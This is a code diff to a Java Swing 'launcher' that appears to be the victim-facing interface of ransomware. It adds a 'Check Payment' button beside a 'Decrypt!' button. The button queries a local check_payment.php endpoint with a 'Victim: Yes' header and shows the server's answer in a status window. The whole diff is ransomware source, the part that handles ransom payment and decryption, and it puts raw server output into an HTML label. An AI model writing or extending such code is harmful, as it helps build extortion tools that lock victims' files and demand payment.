@@ -1,7 +1,11 @@
 import javax.swing.*;
 import java.awt.*;
 import java.awt.event.*;
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.io.InputStreamReader;
 
 public class launcher{
     private JFrame frame;
@@ -38,24 +42,70 @@ public class launcher{
         m2.add(m21);
 
         JButton button1 = new JButton("Decrypt!");
+        JButton button2 = new JButton("Check Payment");
 
         //Implement actions for all buttons
         button1.addActionListener(new DecryptListener());
+        button2.addActionListener(new checkPayment());
         m12.addActionListener(new CloseListener());
         m21.addActionListener(new HelpListener());
 
+
         // Customizing the buttons
         button1.setFont(new Font("Serif", Font.ITALIC, 30));
- 
+        button2.setFont(new Font("Serif", Font.ITALIC, 30));
+
         // Create a new panel
         panel = new JPanel();
 
         //Add them to panel
         panel.add(button1);
+        panel.add(button2);
 
         frame.add(BorderLayout.NORTH,mb);
         frame.add(BorderLayout.SOUTH,panel);
         frame.setVisible(true);
+    }
+}
+
+class checkPayment implements ActionListener{
+    @Override
+    public void actionPerformed(ActionEvent e){
+        try{
+            int id = 1;
+            URL obj = new URL("http://127.0.0.1/check_payment.php?id="+id);
+            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+            con.setRequestMethod("GET");
+            con.addRequestProperty("Victim", "Yes");
+            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+	    	String inputLine;
+            StringBuffer response = new StringBuffer();
+            while((inputLine = in.readLine()) != null){
+                response.append(inputLine);
+            }
+            in.close();
+            String ans  =response.toString();
+            JFrame frame3 = new JFrame("Staus!");
+            frame3.setDefaultCloseOperation(frame3.DISPOSE_ON_CLOSE);
+            JLabel label2 = new JLabel("<html>"+ans+"</html>");
+            frame3.setSize(500,200);
+            JButton button4 = new JButton("Close");
+            JPanel panel2 = new JPanel();
+            panel2.add(button4);
+            ActionListener closeFrame3 = new ActionListener(){
+                @Override
+                public void actionPerformed(ActionEvent e){
+                    frame3.dispose();
+                }
+            };
+            button4.addActionListener(closeFrame3);
+            frame3.add(BorderLayout.CENTER,label2);
+            frame3.add(BorderLayout.SOUTH,panel2);
+            frame3.setVisible(true);
+        }
+        catch (IOException er){
+            er.printStackTrace();
+        }
     }
 }
 
